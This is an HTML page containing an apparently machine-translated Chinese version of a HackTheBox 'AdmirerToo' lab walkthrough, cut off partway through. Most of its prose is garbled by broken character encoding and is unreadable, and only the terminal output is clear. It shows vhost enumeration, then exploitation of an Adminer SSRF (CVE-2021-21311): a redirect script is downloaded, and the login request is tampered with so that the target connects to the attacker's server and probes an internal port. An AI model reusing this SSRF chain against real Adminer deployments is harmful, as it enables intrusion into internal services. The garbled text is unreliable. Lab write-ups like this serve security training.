<html>
<head>
<title>AdmirerToo from HackTheBox â€” Detailed Walkthrough</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">é»‘å®¢ç›’å­ä¸­çš„AdmirerTooè¯¦ç»†æ¼”ç»ƒ</h1>
<blockquote>åŸæ–‡ï¼š<a href="https://infosecwriteups.com/admirertoo-from-hackthebox-detailed-walkthrough-b005ec7a4877?source=collection_archive---------0-----------------------#2022-06-15">https://infosecwriteups.com/admirertoo-from-hackthebox-detailed-walkthrough-b005ec7a4877?source=collection_archive---------0-----------------------#2022-06-15</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="baa2" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">å‘æ‚¨å±•ç¤ºå®Œæˆç›’å­æ‰€éœ€çš„æ‰€æœ‰å·¥å…·å’ŒæŠ€æœ¯ã€‚</h2></div><h1 id="9ca1" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">æœºå™¨ä¿¡æ¯</h1><figure class="ky kz la lb gt lc gh gi paragraph-image"><div class="gh gi kx"><img src="../Images/a6f46ad152fc0c39d6a898f4777881a4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/format:webp/0*yOQ8DNZBoJ3SoHMw.png"/></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">æ¥è‡ªé»‘å®¢ç›’å­çš„è®¡æ—¶</figcaption></figure><p id="2480" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">æˆ‘ä»¬ä»ç«¯å£80å¼€å§‹è¿™ä¸ªç›’å­ï¼Œæœ‰ä¸€ä¸ªç½‘ç«™ï¼Œä¸€äº›æšä¸¾ä¸ºæˆ‘ä»¬æ‰¾åˆ°ä¸€ä¸ªæ•°æ®åº“ã€‚æˆ‘ä»¬åˆ©ç”¨ä¸€ä¸ªSSRFæ¼æ´æ¥æŸ¥æ‰¾è¿è¡Œåœ¨å¦ä¸€ä¸ªç«¯å£ä¸Šçš„OpenTSDBã€‚è¿™ä¹Ÿæ˜¯æ˜“å—æ”»å‡»çš„ï¼Œæˆ‘ä»¬åˆ©ç”¨æ¼æ´åœ¨æœºå™¨ä¸Šè·å¾—ä¸€ä¸ªå¤–å£³ã€‚ç¯é¡¾å››å‘¨ï¼Œæˆ‘ä»¬å‘ç°OpenCatsï¼ŒMySQLå’Œç”¨æˆ·å‡­è¯ã€‚æœ€ç»ˆï¼Œæˆ‘ä»¬ä»¥ç”¨æˆ·Jenniferçš„èº«ä»½è®¿é—®SSHï¼Œè¿™å…è®¸æˆ‘ä»¬è¿›è¡Œç«¯å£è½¬å‘å¹¶è¿œç¨‹è®¿é—®OpenCatsç«™ç‚¹ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬æ‰¾åˆ°äº†ä¸€ç§æ–¹æ³•ï¼Œé€šè¿‡åˆ›å»ºä¸€ä¸ªåºåˆ—åŒ–çš„æœ‰æ•ˆè´Ÿè½½æ¥åˆ é™¤bashè„šæœ¬ï¼Œå¹¶è®©rootç”¨æˆ·ä½¿ç”¨Fail2Banæ¼æ´å’Œwhoisé…ç½®æ–‡ä»¶æ¥æ‰§è¡Œå®ƒã€‚</p><p id="abf1" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">æ‰€éœ€çš„æŠ€èƒ½æ˜¯è‰¯å¥½çš„åˆ—ä¸¾å’Œåˆ©ç”¨ç ”ç©¶çŸ¥è¯†ã€‚å­¦åˆ°çš„æŠ€èƒ½æ˜¯åˆ›å»ºåºåˆ—åŒ–çš„æœ‰æ•ˆè½½è·ï¼Œå¹¶é“¾æ¥æ¼æ´ä»¥è·å¾—ä»£ç æ‰§è¡Œã€‚</p><div class="mf mg gp gr mh mi"><a href="https://www.hackthebox.com/home/machines/profile/427" rel="noopener  ugc nofollow" target="_blank"><div class="mj ab fo"><div class="mk ab ml cl cj mm"><h2 class="bd ir gy z fp mn fr fs mo fu fw ip bi translated">admirator toâ€”â€”ç ´è§£ç›’å­::æ¸—é€æµ‹è¯•å®éªŒå®¤</h2><div class="mp l"><h3 class="bd b gy z fp mn fr fs mo fu fw dk translated">ç™»å½•Hack The Boxå¹³å°ï¼Œè®©æ‚¨çš„ç¬”æµ‹è¯•å’Œç½‘ç»œå®‰å…¨æŠ€èƒ½æ›´ä¸Šä¸€å±‚æ¥¼ï¼</h3></div><div class="mq l"><p class="bd b dl z fp mn fr fs mo fu fw dk translated">www.hackthebox.com</p></div></div><div class="mr l"><div class="ms l mt mu mv mr mw ld mi"/></div></div></a></div><h1 id="c4ea" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">åˆæ­¥ä¾¦å¯Ÿ</h1><p id="8480" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">åƒå¾€å¸¸ä¸€æ ·ï¼Œè®©æˆ‘ä»¬ä»Nmapå¼€å§‹:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nc"><img src="../Images/3d1b112d2f49c3534cec7347114fbe62.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*aQHPf2r8l9nTnWd591h2DQ.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">ç›’å­çš„Nmapæ‰«æ</figcaption></figure><p id="9880" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">ç›®å‰åªæœ‰ç«¯å£80å¯ç”¨ï¼Œæœ‰å‡ ä¸ªä»¥åå¯èƒ½æ„Ÿå…´è¶£çš„ç«¯å£è¢«è¿‡æ»¤æ‰:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nh"><img src="../Images/a81919ecb064d7491c13d51798cd2eb6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*9ZeZL9YE6o6OqAEH.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">ç«¯å£80ä¸Šçš„ç½‘ç«™</figcaption></figure><p id="cda1" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">ç½‘ç«™ä¸Šä»€ä¹ˆéƒ½æ²¡æœ‰ï¼ŒFeroxbusterä¹Ÿæ²¡æœ‰ç”¨è›®åŠ›æ‰¾åˆ°ä»»ä½•ä¸œè¥¿ã€‚ä¸€ä¸ªä¸å­˜åœ¨çš„é¡µé¢ç»™äº†æˆ‘ä»¬ä¸€ä¸ª404æ²¡æœ‰æ‰¾åˆ°é¢„æœŸ:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="cc95" class="nn kg iq nj b gy no np l nq nr">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/admirertoo]<br/>â””â”€# curl -i http://10.10.11.137/pencer   <br/>HTTP/1.1 404 Not Found<br/>Date: Sat, 26 Feb 2022 13:10:59 GMT<br/>Server: Apache/2.4.38 (Debian)<br/>Content-Length: 325<br/>Content-Type: text/html; charset=iso-8859-1<br/><br/>&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;<br/>&lt;html&gt;&lt;head&gt;<br/>&lt;title&gt;404 Not Found&lt;/title&gt;<br/>&lt;/head&gt;&lt;body&gt;<br/>&lt;h1&gt;Not Found&lt;/h1&gt;<br/>&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;<br/>&lt;hr&gt;<br/>&lt;address&gt;Apache/2.4.38 (Debian) Server at &lt;a href="mailto:webmaster@admirer-gallery.htb"&gt;10.10.11.137&lt;/a&gt; Port 80&lt;/address&gt;<br/>&lt;/body&gt;&lt;/html&gt;</span></pre><p id="5555" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">ç„¶è€Œï¼Œmailtoé“¾æ¥æ­ç¤ºäº†ä¸€ä¸ªé¢†åŸŸã€‚è®©æˆ‘ä»¬æŠŠå®ƒæ”¾åœ¨æˆ‘ä»¬çš„ä¸»æœºæ–‡ä»¶ä¸­:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="3641" class="nn kg iq nj b gy no np l nq nr">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/admirertoo]<br/>â””â”€# echo "10.10.11.137 admirer-gallery.htb" &gt;&gt; /etc/ hosts</span></pre><h1 id="89a4" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">Gobuster</h1><p id="add0" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">æµè§ˆåˆ°é‚£ä¸ªåœ°å€ä¼šç»™æˆ‘ä»¬åŒæ ·ç®€å•çš„ç½‘é¡µã€‚è®©æˆ‘ä»¬å°è¯•å¦ä¸€ç§æš´åŠ›ï¼Œè¿™æ¬¡æ˜¯å¯»æ‰¾vhosts:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="364f" class="nn kg iq nj b gy no np l nq nr">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/admirertoo]<br/>â””â”€# gobuster vhost -t 100 -k -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://admirer-gallery.htb  <br/>===============================================================<br/>Gobuster v3.1.0<br/>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br/>===============================================================<br/>[+] Url:          http://admirer-gallery.htb<br/>[+] Method:       GET<br/>[+] Threads:      100<br/>[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt<br/>[+] User Agent:   gobuster/3.1.0<br/>[+] Timeout:      10s<br/>===============================================================<br/>2022/02/26 12:58:27 Starting gobuster in VHOST enumeration mode<br/>===============================================================<br/>Found: db.admirer-gallery.htb (Status: 200) [Size: 2511]<br/>===============================================================<br/>2022/02/26 13:01:14 Finished<br/>===============================================================</span></pre><p id="d005" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">ç°åœ¨æˆ‘ä»¬æœ‰äº†ä¸€ä¸ªå­åŸŸï¼Œå°†å…¶æ·»åŠ åˆ°æˆ‘ä»¬çš„hostsæ–‡ä»¶ä¸­:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="fdfb" class="nn kg iq nj b gy no np l nq nr">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/admirertoo]<br/>â””â”€# echo "10.10.11.137 db.admirer-gallery.htb" &gt;&gt; /etc/ hosts</span></pre><h1 id="f76c" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">ç®¡ç†å‘˜</h1><p id="9792" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">æµè§ˆè¯¥ç½‘ç«™ï¼Œæˆ‘ä»¬ä¼šå‘ç°Adminer 4.7.8çš„ç™»å½•é¡µé¢:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div class="gh gi ns"><img src="../Images/c2cb1d4bbbe9dc421afa59e073a07787.png" data-original-src="https://miro.medium.com/v2/resize:fit:1284/format:webp/0*KBrIQGX5wd7yMWc_.png"/></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">ç®¡ç†å‘˜ç™»å½•é¡µé¢</figcaption></figure><p id="0d6b" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">ç‚¹å‡»â€œå›è½¦â€è¿›å…¥ç³»ç»Ÿï¼Œæˆ‘ä»¬å¯ä»¥æµè§ˆæ•°æ®åº“:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nt"><img src="../Images/26d2c36f80c3b5c26460da80b357b52f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*mcTV7GOaAoYjI_Zi.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">ç®¡ç†å‘˜æ•°æ®åº“æ¢ç´¢</figcaption></figure><p id="16c7" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">ä½ åœ¨è¿™é‡Œåšä¸äº†ä»€ä¹ˆã€‚å¯»æ‰¾æ¼æ´æˆ‘çœ‹åˆ°è¿™ä¸ªç‰ˆæœ¬çš„Admineræ˜¯2020å¹´12æœˆçš„ï¼Œè¿™é‡Œæœ‰å‡ ä¸ªé€‰é¡¹<a class="ae nu" href="https://www.cvedetails.com/vulnerability-list/vendor_id-17755/product_id-44183/Adminer-Adminer.html" rel="noopener ugc nofollow" target="_blank"/>ã€‚å¯¹äº4.7.8æˆ‘ä»¬æœ‰<a class="ae nu" href="https://www.cvedetails.com/cve/CVE-2021-21311/" rel="noopener ugc nofollow" target="_blank">CVE-2021â€“21311</a>ä¸ä¸€ä¸ªæ¼æ´<a class="ae nu" href="https://github.com/vrana/adminer/files/5957311/Adminer.SSRF.pdf" rel="noopener ugc nofollow" target="_blank">åœ¨è¿™é‡Œ</a>ã€‚</p><h1 id="c2d6" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">SSRFè„†å¼±æ€§</h1><p id="ef95" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">é€šè¯»è¿™ä¸ªæ¼æ´ï¼Œæˆ‘ä»¬çœ‹åˆ°æœ‰ä¸€ä¸ªSSRFæ¼æ´ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªè„šæœ¬<a class="ae nu" href="https://gist.githubusercontent.com/bpsizemore/227141941c5075d96a34e375c63ae3bd/raw/0f5e8968a3490190d72ccefd40f9c6b693918d71/redirect.py" rel="noopener ugc nofollow" target="_blank"/>ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨å®ƒæ¥é‡å®šå‘è¯·æ±‚ã€‚è®©æˆ‘ä»¬æŠ“ä½å®ƒï¼Œè®¾ç½®ç›‘å¬:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="0bac" class="nn kg iq nj b gy no np l nq nr">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/admirertoo]<br/>â””â”€# wget https://gist.githubusercontent.com/bpsizemore/227141941c5075d96a34e375c63ae3bd/raw/0f5e8968a3490190d72ccefd40f9c6b693918d71/redirect.py<br/>--2022-02-28 22:31:43--<br/>Connecting to gist.githubusercontent.com (gist.githubusercontent.com)|185.199.109.133|:443... connected.<br/>HTTP request sent, awaiting response... 200 OK<br/>Length: 1290 (1.3K) [text/plain]<br/>Saving to: â€˜redirect.py.1â€™<br/>redirect.py   100%[===============&gt;]   1.26K  --.-KB/s    in 0s      <br/>2022-02-28 22:31:43 (139 MB/s) - â€˜redirect.pyâ€™ saved [1290/1290]</span><span id="9c0a" class="nn kg iq nj b gy nv np l nq nr">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/admirertoo]<br/>â””â”€# python2 redirect.py --port 80 http://127.0.0.1<br/>serving at port 80</span></pre><p id="3730" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">ç­‰å¾…ä¹‹åï¼Œè®©æˆ‘ä»¬å¼€å§‹æ‰“å—ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æ‹¦æˆªæ¥è‡ªæµè§ˆå™¨çš„è¯·æ±‚ã€‚ç°åœ¨å›åˆ°ç½‘ç«™ï¼Œå‡†å¤‡æ‹¦æˆªæ‰“å—ï¼Œç‚¹å‡»æ­¤å¤„è¿›å…¥:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div class="gh gi ns"><img src="../Images/2da40a861d839985626ee439b41b3072.png" data-original-src="https://miro.medium.com/v2/resize:fit:1284/format:webp/0*2C4oJEofXTKYPjIk.png"/></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">ç‚¹å‡»å›è½¦å‘é€åˆ°æ‰“å—</figcaption></figure><p id="a838" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">åœ¨Burpä¸­ï¼Œæˆ‘ä»¬æ•æ‰åˆ°äº†è¯·æ±‚:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nw"><img src="../Images/1c98c2f1cf96c86a50bd82faa641a3b5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*aQv2HLY049wW_mFm.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">ä½¿ç”¨æ‰“å—æ¥æ‹¦æˆªè¯·æ±‚</figcaption></figure><p id="7084" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">POSTæ¶ˆæ¯çš„æœ€åä¸€éƒ¨åˆ†æ˜¯URLç¼–ç çš„ï¼Œå¦‚æœæ‚¨å¯¹å®ƒè¿›è¡Œè§£ç ï¼Œå®ƒçœ‹èµ·æ¥åƒè¿™æ ·:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="ac70" class="nn kg iq nj b gy no np l nq nr">auth[driver]=server&amp;<br/>auth[server]=localhost&amp;<br/>auth[username]=admirer_ro&amp;<br/>auth[password]=1w4nn4b3adm1r3d2!&amp;<br/>auth[db]=admirer&amp;<br/>auth[permanent]=1</span></pre><p id="5400" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">å¦‚æœä½ çœ‹çœ‹è¿™ä¸ªæ¼æ´ï¼Œå®ƒæ˜¾ç¤ºä½ æ”¹å˜ç³»ç»Ÿå­—æ®µä¸ºElasticsearchï¼Œå¯¹äºæˆ‘ä»¬çš„è¡¨å•ï¼Œæˆ‘ä»¬éœ€è¦æ”¹å˜å‚æ•°<strong class="ll ir"> auth[driver] </strong>ï¼Œè¿™æ˜¯ç­‰ä»·çš„ã€‚æ›´å¤æ‚çš„æ˜¯ï¼Œå¦‚æœä½ åœ¨æ–‡æ¡£ä¸­æŸ¥çœ‹<a class="ae nu" href="https://github.com/vrana/adminer/blob/master/adminer/drivers/elastic.inc.php" rel="noopener ugc nofollow" target="_blank">è¿™é‡Œ</a>é©±åŠ¨ç¨‹åºå®é™…ä¸Šè¢«ç§°ä¸ºelasticè€Œä¸æ˜¯elasticsearchã€‚</p><p id="82cc" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">å…¶æ¬¡ï¼Œè¯¥æ¼æ´æ˜¾ç¤ºæ‚¨å°†æœåŠ¡å™¨æ›´æ”¹ä¸ºæ‚¨çš„æ”»å‡»æœºå™¨IPï¼Œå¯¹äºæˆ‘ä»¬çš„è¡¨å•ï¼Œæˆ‘ä»¬éœ€è¦æ›´æ”¹å‚æ•°<strong class="ll ir">auth[æœåŠ¡å™¨] </strong>ï¼Œè¿™æ˜¯ç­‰æ•ˆçš„ã€‚</p><p id="2686" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">æ‰€ä»¥æˆ‘ä»¬æ”¹å˜çš„å‚æ•°çœ‹èµ·æ¥åƒè¿™æ ·:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="e997" class="nn kg iq nj b gy no np l nq nr">auth[driver]=elastic&amp;<br/>auth[server]=10.10.16.95&amp;<br/>auth[username]=admirer_ro&amp;<br/>auth[password]=1w4nn4b3adm1r3d2!&amp;<br/>auth[db]=admirer&amp;<br/>auth[permanent]=1</span></pre><p id="cb16" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">URLå¯¹å…¶è¿›è¡Œç¼–ç ï¼Œå¹¶åœ¨Burpä¸­è¿›è¡Œæ›¿æ¢ï¼Œå¦‚ä¸‹æ‰€ç¤º:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nx"><img src="../Images/2b22d18a059458766db3c3f70efd295a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*av-l8x4ZEqvDzSDK.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">Urlç¼–ç å­—ç¬¦ä¸²</figcaption></figure><p id="f8cc" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">å•å‡»forwardï¼Œæ‚¨å°†çœ‹åˆ°ä¸€ä¸ªæ‰“å—å¼çš„GETè¯·æ±‚:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi ny"><img src="../Images/0d04c580b001712fc384e3ed60ec1ccf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*X_XVNAKOgKjpHoAE.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">æ‰“å—æ—¶è½¬å‘è¯·æ±‚</figcaption></figure><p id="9852" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">å†æ¬¡å•å‡»forwardï¼Œæ‚¨å°†çœ‹åˆ°å¦‚ä¸‹é¡µé¢ï¼Œè€Œä¸æ˜¯æˆ‘ä»¬ä¹‹å‰çœ‹åˆ°çš„db adminå±å¹•:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nz"><img src="../Images/5bef80d00523f38125112eeb48b9a446.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*MEiopDgHojQ83c_4.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">ç®¡ç†å‘˜é¡µé¢æ˜¾ç¤ºæ¥è‡ªæ¼æ´çš„å“åº”</figcaption></figure><p id="2930" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">å¦‚æœä½ åœ¨è¾“å‡ºä¸Šåšhtml2textï¼Œä½ ä¼šçœ‹åˆ°å®ƒæ˜¯æ¥è‡ªæˆ‘ä»¬åœ¨å¼€å§‹çœ‹åˆ°çš„æœ€åˆçš„ä»°æ…•è€…-ç”»å»Š. htbç«™ç‚¹çš„index.phpé¡µé¢:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="20ef" class="nn kg iq nj b gy no np l nq nr">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/admirertoo]<br/>â””â”€# cat html | html2text<br/><br/>Admirer<br/>****** Admirer of theworld. ******<br/>Welcome to my image gallery.<br/>Are you an admirer too?<br/> [img/highway.jpg]<br/>******_Biodiesel_squid_******<br/>Have_you_ever_seen_anything_like_it?<br/>[img/portfolio_item_4.png]<br/>******_raclette_taxidermy_******<br/>Impressive,_isn't_it?<br/>&lt;SNIP&gt;</span></pre><p id="0214" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">æŸ¥çœ‹æˆ‘ä»¬åœ¨Kaliä¸­è¿è¡Œçš„é‡å®šå‘å™¨ï¼Œæˆ‘ä»¬çœ‹åˆ°æˆ‘ä»¬æˆåŠŸäº†:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="f55d" class="nn kg iq nj b gy no np l nq nr">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/admirertoo]<br/>â””â”€# python2 redirect.py --port 80 http://127.0.0.1<br/>serving at port 80<br/>10.10.11.137 - - [28/Feb/2022 22:53:51] "GET / HTTP/1.0" 301 -<br/>10.10.11.137 - - [28/Feb/2022 22:53:52] "GET / HTTP/1.0" 301 -</span></pre><p id="a30c" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">è¿™è¯å®äº†æˆ‘ä»¬å°†è¯·æ±‚é‡å®šå‘å›æœºå™¨ä¸Šçš„ç«¯å£80ï¼Œå¹¶ä¸”æˆ‘ä»¬å¯ä»¥ä½¿ç”¨SSRFæ¥è¿›ä¸€æ­¥æšä¸¾å®ƒã€‚å¦‚æœä½ éœ€è¦ä¸€æœ¬å…³äºSSRFçš„å…¥é—¨ä¹¦ï¼Œé‚£ä¹ˆPortSwiggeræœ‰ä¸€ç¯‡å¥½æ–‡ç« <a class="ae nu" href="https://portswigger.net/web-security/ssrf" rel="noopener ugc nofollow" target="_blank">åœ¨è¿™é‡Œ</a>ã€‚</p><h1 id="4e17" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">æ‰«æè¿‡æ»¤ç«¯å£</h1><p id="0793" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">å¦‚æœæˆ‘ä»¬å›é¡¾ä¸€ä¸‹å¼€å§‹æ—¶çš„Nmapæ‰«æï¼Œä¼šå‘ç°æœ‰å‡ ä¸ªç»è¿‡è¿‡æ»¤çš„ç«¯å£ï¼Œè¿™æ˜¯æˆ‘ä»¬æ„Ÿå…´è¶£çš„ä¸€ä¸ª:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="44b8" class="nn kg iq nj b gy no np l nq nr">4242/tcp  filtered vrml-multi-use</span></pre><p id="d8b1" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">åˆ©ç”¨æˆ‘ä»¬ä½¿ç”¨SSRFæ”»å‡»èƒ½åŠ›ï¼Œæˆ‘ä»¬å¯ä»¥ä»æœºå™¨å†…éƒ¨æ¢æµ‹ç«¯å£ï¼Œæˆ‘ä»¬åªéœ€è¦æ”¹å˜æˆ‘ä»¬çš„é‡å®šå‘å™¨:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="9b31" class="nn kg iq nj b gy no np l nq nr">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/admirertoo]<br/>â””â”€# python2 redirect.py --port 80 http://127.0.0.1:4242<br/>serving at port 80</span></pre><p id="9d84" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">ç°åœ¨ï¼Œå½“æˆ‘ä»¬æ”¶åˆ°Kaliä¸Šçš„boxè¯·æ±‚æ—¶ï¼Œæˆ‘ä»¬ä¼šå°†å…¶é‡å®šå‘å›ç«¯å£4242ã€‚æˆ‘ä»¬éœ€è¦æ‰§è¡Œä¸ä¹‹å‰ç›¸åŒçš„è¿‡ç¨‹æ¥æ‰§è¡ŒSSRFæ”»å‡»ã€‚å›åˆ°ç½‘ç»œæµè§ˆå™¨ï¼Œè¿›å…¥ç™»å½•é¡µé¢ã€‚å‡†å¤‡å¥½æ‹¦æˆªæ‰“å—åï¼Œç‚¹å‡»è¾“å…¥æŒ‰é’®:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div class="gh gi ns"><img src="../Images/822527c1c57f5e7b219b470fa1e9d946.png" data-original-src="https://miro.medium.com/v2/resize:fit:1284/format:webp/0*J-Qjw_4JNG5Yvad6.png"/></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">å‘æ‰“å—è€…å‘é€è¯·æ±‚</figcaption></figure><p id="5895" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">æ›´æ”¹æœ€åä¸€éƒ¨åˆ†ï¼Œä½¿auth[driver]è®¾ç½®ä¸ºelasticï¼Œauth[server]è®¾ç½®ä¸ºæˆ‘ä»¬çš„Kali IP:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nx"><img src="../Images/dd75a62c8bbeda698e62fa9a90bd4c98.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*inSbb3MSEI7WVKrq.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">æ›´æ”¹å‚æ•°ä»¥æŒ‡å‘Kali</figcaption></figure><p id="f697" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi 